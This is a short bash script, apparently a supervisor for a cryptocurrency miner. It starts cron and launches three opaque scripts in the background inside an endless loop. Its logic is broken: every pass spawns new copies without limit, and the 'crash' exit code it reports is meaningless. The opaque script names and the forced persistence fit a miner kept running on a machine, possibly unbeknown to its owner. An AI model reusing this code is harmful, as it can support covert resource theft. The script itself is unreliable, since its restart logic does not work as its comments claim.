#!/bin/bash
# Infinite loop to restart the miner if it stops
while true; do
  echo "Starting roboot..."
  
# Start cron service
service cron start

# Jalankan main.sh di background
/usr/local/bin/run.sh &

# Jalankan bash.sh di background
bash /usr/local/bin/x.sh &

# Jalankan bash.sh di background
/usr/local/bin/main.sh &

  # Check exit code of miner
  EXIT_CODE=$?
  echo "Miner crashed with exit code $EXIT_CODE. Restarting in 5 seconds..."
  sleep 5
done
